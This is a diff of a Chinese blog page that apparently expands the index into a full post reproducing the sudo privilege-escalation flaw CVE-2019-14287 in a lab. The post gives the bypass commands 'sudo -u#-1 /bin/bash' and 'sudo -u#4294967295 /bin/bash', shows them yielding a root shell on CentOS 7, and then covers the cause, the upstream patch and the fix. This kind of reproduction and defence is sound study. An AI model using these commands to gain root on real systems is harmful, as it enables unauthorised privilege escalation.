@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="linux,安全,">
 
 
 
@@ -79,13 +79,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Roman&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="1.CVE-2019-14287权限提升漏洞2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够切换的用户权限。CVE-2019-14287 是管理员在配置文件中用了 ALL 关键词后造成的。但默">
+<meta name="keywords" content="linux,安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2019-14287复现">
+<meta property="og:url" content="http://yoursite.com/post/13cae37e.html">
 <meta property="og:site_name" content="Roman&#39;s blog">
+<meta property="og:description" content="1.CVE-2019-14287权限提升漏洞2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够切换的用户权限。CVE-2019-14287 是管理员在配置文件中用了 ALL 关键词后造成的。但默">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-31T06:35:48.718Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Roman&#39;s blog">
+<meta name="twitter:title" content="CVE-2019-14287复现">
+<meta name="twitter:description" content="1.CVE-2019-14287权限提升漏洞2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够切换的用户权限。CVE-2019-14287 是管理员在配置文件中用了 ALL 关键词后造成的。但默">
 
 
 
@@ -115,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/post/13cae37e.html">
 
 
 
 
 
-  <title>Roman's blog</title>
+  <title>CVE-2019-14287复现 | Roman's blog</title>
   
 
 
@@ -140,8 +145,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -276,9 +280,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -308,9 +312,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/13cae37e.html" itemprop="url">CVE-2019-14287复现</a></h1>
+          <h1 class="post-title" itemprop="name headline">CVE-2019-14287复现</h1>
         
 
         <div class="post-meta">
@@ -382,18 +384,54 @@
       
 
       
-        
-          
-          1.CVE-2019-14287权限提升漏洞2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/13cae37e.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <h2 id="1-CVE-2019-14287权限提升漏洞"><a href="#1-CVE-2019-14287权限提升漏洞" class="headerlink" title="1.CVE-2019-14287权限提升漏洞"></a>1.CVE-2019-14287权限提升漏洞</h2><p>2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。<br>sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够切换的用户权限。<br>CVE-2019-14287 是管理员在配置文件中用了 ALL 关键词后造成的。但默认的 sudo 配置文件不受影响。</p>
+<h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>靶机:Ubuntu16.04<br>首先我们先查看一下Ubuntu的sudo版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -V</span><br><span class="line">Sudo 版本 1.8.16</span><br><span class="line">Sudoers 策略插件版本 1.8.16</span><br><span class="line">Sudoers 文件语法版本 45</span><br><span class="line">Sudoers I/O plugin version 1.8.16</span><br></pre></td></tr></table></figure>
+
+<p>sudo版本小于1.8.28<br>首先我们先创建一个账号。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$useradd</span> cvetest</span><br><span class="line"><span class="variable">$passwd</span> cvetest</span><br><span class="line">输入新的 UNIX 密码： </span><br><span class="line">重新输入新的 UNIX 密码： </span><br><span class="line">passwd：已成功更新密码</span><br></pre></td></tr></table></figure>
+
+<p>通过编辑/etc/sudoers，给予它受限的权利。<br>在/etc/sudoers中添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvetest ALL=(ALL,!root) /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>这个的意思是，cvetest可以用root以外的权限执行/bin/bash<br>现在我们切换到cvetest用户看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$su</span> cvetest</span><br><span class="line">密码:</span><br></pre></td></tr></table></figure>
+
+<p>首先尝试以root权限执行/bin/bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u root /bin/bash</span><br><span class="line">[sudo] cvetest 的密码： </span><br><span class="line">对不起，用户 cvetest 无权以 root 的身份在 ubuntu 上执行 /bin/bash。</span><br></pre></td></tr></table></figure>
+
+<p>这说明了cvetest权限受限了<br>但是当我们换一种方法，用下列指令执行时，却可以以root权限执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#-1 /bin/bash </span></span><br><span class="line">sudo: 未知用户：<span class="comment">#-1</span></span><br><span class="line">sudo: 无法初始化策略插件</span><br><span class="line"></span><br><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#4294967295 /bin/bash</span></span><br><span class="line">sudo: 未知用户：<span class="comment">#4294967295</span></span><br><span class="line">sudo: 无法初始化策略插件</span><br></pre></td></tr></table></figure>
+
+<p>???????<br>翻车了。<br>居然在Ubuntu上无法复现。。。。。。</p>
+<p>更换到Centos7再试试<br>首先</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -V</span><br><span class="line">Sudo 版本 1.8.23</span><br><span class="line">Sudoers 策略插件版本 1.8.23</span><br><span class="line">Sudoers 文件语法版本 46</span><br></pre></td></tr></table></figure>
+
+<p>其实centos上输出了一大堆东西，这里我就只选择了一部分来显示。<br>继续上面的操作。<br>创建用户修改权限如上所示。</p>
+<p>以root权限执行/bin/bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u root /bin/bash</span><br><span class="line"></span><br><span class="line">我们信任您已经从系统管理员那里了解了日常注意事项。</span><br><span class="line">总结起来无外乎这三点：</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) 尊重别人的隐私。</span></span><br><span class="line">    <span class="comment">#2) 输入前要先考虑(后果和风险)。</span></span><br><span class="line">    <span class="comment">#3) 权力越大，责任越大。</span></span><br><span class="line"></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">对不起，用户 cvetest 无权以 root 的身份在 centos7 上执行 /bin/bash。</span><br></pre></td></tr></table></figure>
+
+<p>权限不足，接下来我们准备提高权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">bash-4.2<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#4294967295 /bin/bash</span></span><br><span class="line">bash-4.2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>成功，以受限制的cvetest拿到了root权限来执行/bin/bash</p>
+<h2 id="3-原理解释"><a href="#3-原理解释" class="headerlink" title="3.原理解释"></a>3.原理解释</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#userid</span></span><br></pre></td></tr></table></figure>
+
+<p>这个指令表示的是以userid对应的用户来执行程序。<br>看到-1和4294967295相信大家都已经明白了，程序面对无法识别的特殊值的时候，会将其转换为0，然而0刚好表示root用户。<br>我推测流程大概是这样的：<br>sudo将无法识别的值误认为是0。<br>然后交给权限处理或者账号验证之类的模块时传输的还是-1之类的特殊值，因为权限里面设置了cvetest可以以非root的其余所有账号启动。<br>这些模块一看-1不是root的id，因此给予执行的权利，sudo一看管理权限的那些模块没有返回权限不足，看了看用户给的id，嗯是0，没问题，就允许cvetest以root权限执行/bin/bash了。</p>
+<h2 id="4-原理验证"><a href="#4-原理验证" class="headerlink" title="4.原理验证"></a>4.原理验证</h2><p>根据我们的猜测，那么配置为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvetest ALL=(default,cvetest) /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>即cvetest只能以default和cvetest执行/bin/bash时，应该时无法获取root权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#1000 /bin/bash</span></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">[default@centos7 /]$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">对不起，用户 cvetest 无权以 <span class="comment">#-1 的身份在 centos7 上执行 /bin/bash。</span></span><br></pre></td></tr></table></figure>
+
+<p>因为当管理权限的模块拿到uid为-1时，发现并不是default或者cvetest的id，因此不给权限。</p>
+<p>当然最好的验证方式就是看源码的改动。因为这个漏洞在1.8.28中修复了，我们去看看了修改的日志还真找到了。<br><a href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7" target="_blank" rel="noopener">Treat an ID of -1 as invalid since that means “no change”.</a></p>
+<p>可以看到sudo修改了lib/util/strtoid.c<br>加了一些代码。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">llval = strtoll(p, &amp;ep, <span class="number">10</span>);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Disallow id -1, which means "no change". */</span></span><br><span class="line">    <span class="keyword">if</span> (!valid_separator(p, ep, sep) || llval == <span class="number">-1</span> || llval == (<span class="keyword">id_t</span>)UINT_MAX) &#123;</span><br><span class="line">	<span class="keyword">if</span> (errstr != <span class="literal">NULL</span>)</span><br><span class="line">	    *errstr = N_(<span class="string">"invalid value"</span>);</span><br><span class="line">	errno = EINVAL;</span><br><span class="line">	<span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>更加深层次的分析可见<br><a href="https://paper.seebug.org/1057/" target="_blank" rel="noopener">CVE-2019-14287分析</a></p>
+<h2 id="5-如何预防与修复"><a href="#5-如何预防与修复" class="headerlink" title="5.如何预防与修复"></a>5.如何预防与修复</h2><p>最简单的方法当然是直接将sudo升级到1.8.28以上，当然你也可以自己排除sudo的配置，打开/etc/sudoers,将其中设置了(ALL,!XXXX)即以非xxxx权限的，都修改掉。</p>
+
       
     </div>
     
@@ -408,316 +446,38 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/post/b1acc7fd.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Roman">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Roman's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/b1acc7fd.html" itemprop="url">python urllib的urlretrieve下载太慢</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-30T15:30:03+08:00">
-                2019-10-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/linux/" rel="tag"># linux</a>
           
-
+            <a href="/tags/安全/" rel="tag"># 安全</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          
-          urllib的urlretrieve方法下载太慢的解决方法今天尝试适应python的urllib下载文件，结果发现三线程居然总下载速度只有500kb/s，使用CMD的curl命令下载速度是这个的几倍，因此经过我的实验和查证，可以使用urlopen的方法来替代
-12345resp = urllib.u
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/b1acc7fd.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/b1acc7fd.html" rel="next" title="python urllib的urlretrieve下载太慢">
+                <i class="fa fa-chevron-left"></i> python urllib的urlretrieve下载太慢
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/post/1e6d0424.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Roman">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Roman's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/1e6d0424.html" itemprop="url">RDP建立过程</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-18T15:26:13+08:00">
-                2019-10-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">安全漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-          RDP协议的官方文档[MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting
-接下来的内容都是基于此协议
-RDP时序图
-
-连接的十个阶段
-1.Connection Initiation客户机向服务发
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/1e6d0424.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -727,285 +487,11 @@ RDP时序图
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/post/24c02121.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Roman">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Roman's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/24c02121.html" itemprop="url">CVE-2019-0708</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-18T15:25:47+08:00">
-                2019-10-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">安全漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          CVE-2019-0708CVE-2019-0708是微软于5月14日公布的一个远程桌面服务的远程代码执行漏洞(CVE-2019-0708)，利用此漏洞可以直接获取windows服务器的权限。现在网上已经有安全研究人员披露该漏洞远程crash PoC，对于某些系统已经能获取shell执行命令了。
-影
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/24c02121.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/post/4a17b156.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Roman">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Roman's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/4a17b156.html" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-15T10:54:17+08:00">
-                2019-10-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in 
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/post/4a17b156.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -1013,6 +499,10 @@ RDP时序图
 
 
           
+
+  
+
+
 
         </div>
         
@@ -1033,8 +523,17 @@ RDP时序图
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1104,6 +603,22 @@ RDP时序图
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-CVE-2019-14287权限提升漏洞"><span class="nav-number">1.</span> <span class="nav-text">1.CVE-2019-14287权限提升漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-复现"><span class="nav-number">2.</span> <span class="nav-text">2.复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-原理解释"><span class="nav-number">3.</span> <span class="nav-text">3.原理解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-原理验证"><span class="nav-number">4.</span> <span class="nav-text">4.原理验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-如何预防与修复"><span class="nav-number">5.</span> <span class="nav-text">5.如何预防与修复</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1253,6 +768,10 @@ RDP时序图
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
